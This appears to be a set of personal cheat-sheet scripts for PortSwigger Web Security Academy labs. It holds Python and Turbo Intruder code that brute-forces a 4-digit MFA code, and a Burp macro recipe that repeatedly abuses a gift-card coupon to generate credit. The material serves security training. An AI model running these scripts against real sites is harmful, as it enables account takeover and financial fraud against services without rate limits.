# Scripts — Web Security

---

## 1. OTP Brute Force — Python Requests

Use when you need to brute force a 4 digit OTP via Python.
Correct OTP returns 302, wrong ones return 200.

```python
import requests

# ── CONFIG ────────────────────────────────────────────────
URL     = "https://TARGET.web-security-academy.net/login2"
COOKIES = {"session": "YOUR_SESSION_COOKIE"}
# ──────────────────────────────────────────────────────────

found = False

for otp in range(10000):
    code = "{:04d}".format(otp)   # 0000 → 9999

    response = requests.post(
        URL,
        data={"mfa-code": code},
        cookies=COOKIES,
        allow_redirects=False     # catch the 302 before redirect
    )

    print("[*] Trying {} → {}".format(code, response.status_code), end="\r")

    if response.status_code == 302:
        print("\n[+] VALID OTP FOUND: {}".format(code))
        print("[+] Redirect location: {}".format(response.headers.get("Location")))
        found = True
        break

if not found:
    print("\n[-] No valid OTP found.")
```

**How to use:**
1. Log in and navigate to the MFA page
2. Grab your session cookie from Burp
3. Paste it into COOKIES
4. Set the correct URL
5. Run: `python otp_bruteforce.py`

---

## 2. OTP Brute Force — Turbo Intruder

Use when you need to brute force a 4 digit OTP inside Burp Suite.
Mark the OTP field with %s in the request editor.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    for otp in range(10000):
        engine.queue(target.req, "{:04d}".format(otp))

def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```

**How to use:**
1. Send POST /login2 to Turbo Intruder
2. Replace OTP value with %s in the request:
   `mfa-code=%s`
3. Paste this script in the Python panel
4. Click Attack
5. Wait for a 302 to appear in the results table

**Note:**
- Uses .format() instead of f-strings because Turbo Intruder runs on Jython (Python 2)
- f-strings will cause SyntaxError in Turbo Intruder

---

## 3. Infinite Money Loop — Burp Macro + Intruder

Use when the app has a gift card + coupon profit loop.

**Macro steps to record:**
```
Step 1: POST /cart                  (add gift card)
Step 2: POST /cart/coupon           (apply SIGNUP30)
Step 3: POST /cart/checkout         (complete purchase)
Step 4: POST /gift-card             (redeem gift card code)
```

**Intruder setup:**
```
Request: GET /my-account
Payload: Null payloads
Count:   412 (or calculate: amount needed / profit per cycle)
```

**Profit calculation:**
```
Gift card cost:      $10
After 30% coupon:    $7
Gift card value:     $10
Profit per cycle:    $3

Target item price:   $1337
Starting balance:    $100
Amount needed:       $1237

Cycles needed: 1237 / 3 = 412 (rounded up)
```

**Why GET /my-account:**
It is a safe dummy request used only to trigger the macro.
The real work is done by the macro each time Intruder fires.

